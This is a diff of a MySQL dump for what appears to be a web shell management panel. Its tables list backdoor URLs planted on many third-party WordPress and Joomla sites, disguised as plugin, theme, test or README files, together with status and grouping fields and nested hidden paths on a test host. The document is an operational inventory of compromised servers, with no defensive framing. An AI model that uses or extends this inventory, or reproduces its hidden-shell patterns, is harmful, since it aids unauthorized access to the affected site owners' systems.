@@ -1,6 +1,6 @@
 /*
 SQLyog Ultimate v11.24 (32 bit)
-MySQL - 5.7.40 : Database - webadmin
+MySQL - 5.7.44-log : Database - webadmin
 *********************************************************************
 */
 
@@ -12,10 +12,6 @@ MySQL - 5.7.40 : Database - webadmin
 /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
 /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
 /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
-CREATE DATABASE /*!32312 IF NOT EXISTS*/`webadmin` /*!40100 DEFAULT CHARACTER SET utf8mb4 */;
-
-USE `webadmin`;
-
 /*Table structure for table `tu_admin` */
 
 DROP TABLE IF EXISTS `tu_admin`;
@@ -430,7 +426,7 @@ CREATE TABLE `tu_shell` (
 
 /*Data for the table `tu_shell` */
 
-insert  into `tu_shell`(`id`,`host`,`scheme`,`group_id`,`status`,`num`,`maxurl`,`minurl`,`dir`,`lock`,`remark`,`addtime`,`uptime`,`sitenum`) values (9,'127.0.0.223','http',1,2,1,'http://127.0.0.223/wp-content/admin.php','admin.php',0,1,'',1741077073,1781248470,10),(15,'ergoneo.be','http',3,2,1,'http://ergoneo.be/core/cghmj.php?pops','admin.php',0,2,'',1776503217,1781601194,30),(23,'sina.com.cn','http',6,5,0,'http://sina.com.cn/sss.php','admin.php',0,0,'',1781663290,1781663290,0),(24,'jubatu.org','https',6,2,0,'https://jubatu.org/resources/vendor/gmaps/test/lib/github.php?pops','admin.php',0,0,'',1781663334,1781663334,0),(25,'katerinariga.gr','https',6,5,0,'https://katerinariga.gr/admin/language/en-gb/extension/extension/Y7Q5LqcFW2x.php?pops','admin.php',0,0,'',1781663347,1781663347,0),(26,'www.davidegiovagnoli.com','https',6,5,0,'https://www.davidegiovagnoli.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_Pz2inx.php?pops','admin.php',0,0,'',1781663364,1781663364,0),(27,'kaccsa.com','https',6,1,0,'https://kaccsa.com/plugins/content/jw_joomla/jw_joomla/includes/elements/Firewall_6JHKQx.php?pops','admin.php',0,0,'',1781663377,1781663377,0),(28,'modz.ch','http',6,1,0,'http://modz.ch/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_gMRuxx.php?pops','admin.php',0,0,'',1781663389,1781663389,0),(29,'www.k-financialservices.com','http',6,5,0,'http://www.k-financialservices.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_weAqDx.php?pops','admin.php',0,0,'',1781663402,1781663402,0),(30,'www.menwin.net','http',6,5,0,'http://www.menwin.net/wp-content/plugins/wptelegram-widget/includes/restApi/README.php?pop','admin.php',0,0,'',1781663525,1781663525,0),(31,'saqifamarketing.com','http',6,5,0,'http://saqifamarketing.com/_protected/tests/codeception/common/templates/fixtures/README.php?pops','admin.php',0,0,'',1781663539,1781663539,0),(32,'www.ryv-travel.com.ar','http',6,5,0,'http://www.ryv-travel.com.ar/includes/recaptcha/tests/ReCaptcha/RequestMethod/huTest.php.pif','admin.php',0,0,'',1781663553,1781663553,0),(33,'jestesskarbem.org','https',6,5,0,'https://jestesskarbem.org/plugins/content/jw_joomla/jw_joomla/includes/elements/fhujk.php?pops','admin.php',0,0,'',1781663562,1781663562,0),(34,'pilshellas.gr','https',6,5,0,'https://pilshellas.gr/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_rtZfSx.php?pops','admin.php',0,0,'',1781663575,1781663575,0),(35,'zaukovo.ru','http',6,1,0,'http://zaukovo.ru/plugins/content/jw_joomla/jw_joomla/includes/elements/sdga.php?pops','admin.php',0,0,'',1781663586,1781663586,0);
+insert  into `tu_shell`(`id`,`host`,`scheme`,`group_id`,`status`,`num`,`maxurl`,`minurl`,`dir`,`lock`,`remark`,`addtime`,`uptime`,`sitenum`) values (9,'127.0.0.107','http',1,0,1,'http://127.0.0.107/index.php','admin.php',0,1,'',1741077073,1782115736,10),(15,'ergoneo.be','http',3,2,1,'http://ergoneo.be/core/cghmj.php?pops','admin.php',0,2,'',1776503217,1781601194,30),(23,'sina.com.cn','http',6,5,0,'http://sina.com.cn/sss.php','admin.php',0,0,'',1781663290,1781663290,0),(24,'jubatu.org','https',6,2,0,'https://jubatu.org/resources/vendor/gmaps/test/lib/github.php?pops','admin.php',0,0,'',1781663334,1781663334,0),(25,'katerinariga.gr','https',6,5,0,'https://katerinariga.gr/admin/language/en-gb/extension/extension/Y7Q5LqcFW2x.php?pops','admin.php',0,0,'',1781663347,1781663347,0),(26,'www.davidegiovagnoli.com','https',6,5,0,'https://www.davidegiovagnoli.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_Pz2inx.php?pops','admin.php',0,0,'',1781663364,1781663364,0),(27,'kaccsa.com','https',6,1,0,'https://kaccsa.com/plugins/content/jw_joomla/jw_joomla/includes/elements/Firewall_6JHKQx.php?pops','admin.php',0,0,'',1781663377,1781663377,0),(28,'modz.ch','http',6,1,0,'http://modz.ch/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_gMRuxx.php?pops','admin.php',0,0,'',1781663389,1781663389,0),(29,'www.k-financialservices.com','http',6,5,0,'http://www.k-financialservices.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_weAqDx.php?pops','admin.php',0,0,'',1781663402,1781663402,0),(30,'www.menwin.net','http',6,5,0,'http://www.menwin.net/wp-content/plugins/wptelegram-widget/includes/restApi/README.php?pop','admin.php',0,0,'',1781663525,1781663525,0),(31,'saqifamarketing.com','http',6,5,0,'http://saqifamarketing.com/_protected/tests/codeception/common/templates/fixtures/README.php?pops','admin.php',0,0,'',1781663539,1781663539,0),(32,'www.ryv-travel.com.ar','http',6,5,0,'http://www.ryv-travel.com.ar/includes/recaptcha/tests/ReCaptcha/RequestMethod/huTest.php.pif','admin.php',0,0,'',1781663553,1781663553,0),(33,'jestesskarbem.org','https',6,5,0,'https://jestesskarbem.org/plugins/content/jw_joomla/jw_joomla/includes/elements/fhujk.php?pops','admin.php',0,0,'',1781663562,1781663562,0),(34,'pilshellas.gr','https',6,5,0,'https://pilshellas.gr/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_rtZfSx.php?pops','admin.php',0,0,'',1781663575,1781663575,0),(35,'zaukovo.ru','http',6,1,0,'http://zaukovo.ru/plugins/content/jw_joomla/jw_joomla/includes/elements/sdga.php?pops','admin.php',0,0,'',1781663586,1781663586,0);
 
 /*Table structure for table `tu_shell_group` */
 
@@ -450,7 +446,7 @@ CREATE TABLE `tu_shell_group` (
 
 /*Data for the table `tu_shell_group` */
 
-insert  into `tu_shell_group`(`id`,`name`,`mmtext`,`mmurl`,`checkurl`,`checktext`,`status`,`addtime`) values (1,'B303','admin.php','','/jp2023','###--->B304',2,NULL),(2,'B304','','','/jp2023','###--->B304',1,NULL),(3,'D2-cf001','','','','',2,NULL),(4,'D2-cf002','','','','',2,NULL),(5,'D2-cf003','','','','',2,1776482448),(6,'D2-cf004','',NULL,NULL,NULL,1,1776482448);
+insert  into `tu_shell_group`(`id`,`name`,`mmtext`,`mmurl`,`checkurl`,`checktext`,`status`,`addtime`) values (1,'B303','admin.php','','/jp2023','###--->B304',1,NULL),(2,'B304','','','/jp2023','###--->B304',2,NULL),(3,'D2-cf001','','','','',2,NULL),(4,'D2-cf002','','','','',2,NULL),(5,'D2-cf003','','','','',2,1776482448),(6,'D2-cf004','','','','',2,1776482448);
 
 /*Table structure for table `tu_shell_max` */
 
@@ -463,28 +459,28 @@ CREATE TABLE `tu_shell_max` (
   `addtime` int(10) DEFAULT NULL COMMENT '增加时间',
   `status` int(1) DEFAULT '1' COMMENT '1:正常2：停用',
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=43 DEFAULT CHARSET=utf8mb4;
+) ENGINE=MyISAM AUTO_INCREMENT=49 DEFAULT CHARSET=utf8mb4;
 
 /*Data for the table `tu_shell_max` */
 
-insert  into `tu_shell_max`(`id`,`shell_id`,`url`,`addtime`,`status`) values (41,15,'http://ergoneo.be/core/cghmj.php?pops',1781595308,1),(42,15,'http://ergoneo.be/cored/cghmj.php?pops',1781595200,1);
+insert  into `tu_shell_max`(`id`,`shell_id`,`url`,`addtime`,`status`) values (48,9,'http://127.0.0.107/wp-includes/y70db3b7f/y70db3b7f/y70db3b7f/y70db3b7f/y70db3b7f/y70db3b7f/y70db3b7f/y70db3b7f/y70db3b7f/index.php',1782184979,1),(47,9,'http://127.0.0.107/wp-content/hb8315c8c/hb8315c8c/hb8315c8c/hb8315c8c/hb8315c8c/index.php',1782184979,1),(46,9,'http://127.0.0.107/wp-admin/gabf6ba7f/gabf6ba7f/gabf6ba7f/gabf6ba7f/gabf6ba7f/gabf6ba7f/index.php',1782184979,1);
 
-/*Table structure for table `tu_shell_mm` */
+/*Table structure for table `tu_shell_min` */
 
-DROP TABLE IF EXISTS `tu_shell_mm`;
+DROP TABLE IF EXISTS `tu_shell_min`;
 
-CREATE TABLE `tu_shell_mm` (
+CREATE TABLE `tu_shell_min` (
   `id` int(10) NOT NULL AUTO_INCREMENT,
   `shell_id` int(10) DEFAULT NULL COMMENT 'shell_id',
   `url` varchar(500) DEFAULT NULL COMMENT 'url',
   `addtime` int(10) DEFAULT NULL COMMENT '增加时间',
   `status` int(1) DEFAULT '1' COMMENT '1:正常2：停用',
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=146 DEFAULT CHARSET=utf8mb4 COMMENT='大码';
+) ENGINE=MyISAM AUTO_INCREMENT=158 DEFAULT CHARSET=utf8mb4 COMMENT='大码';
 
-/*Data for the table `tu_shell_mm` */
+/*Data for the table `tu_shell_min` */
 
-insert  into `tu_shell_mm`(`id`,`shell_id`,`url`,`addtime`,`status`) values (141,15,'http://127.0.0.223/wp-includes/SimplePie/index.php',1776735308,1),(142,15,'http://127.0.0.223/wp-includes/l10n/index.php',1776735308,1),(143,15,'http://127.0.0.223/wp-includes/php-compat/index.php',1776735308,1),(144,15,'http://127.0.0.223/wp-includes/sitemaps/index.php',1776735308,1),(145,15,'http://127.0.0.223/wp-includes/style-engine/index.php',1776735308,1);
+insert  into `tu_shell_min`(`id`,`shell_id`,`url`,`addtime`,`status`) values (157,9,'http://127.0.0.107/wp-includes/la0fe43aa/la0fe43aa/la0fe43aa/index.php',1782184978,1),(156,9,'http://127.0.0.107/wp-content/w60e0a517/w60e0a517/w60e0a517/w60e0a517/w60e0a517/w60e0a517/index.php',1782184978,1),(155,9,'http://127.0.0.107/wp-admin/wf1c42e65/wf1c42e65/wf1c42e65/index.php',1782184978,1);
 
 /*Table structure for table `tu_upload_files` */
 
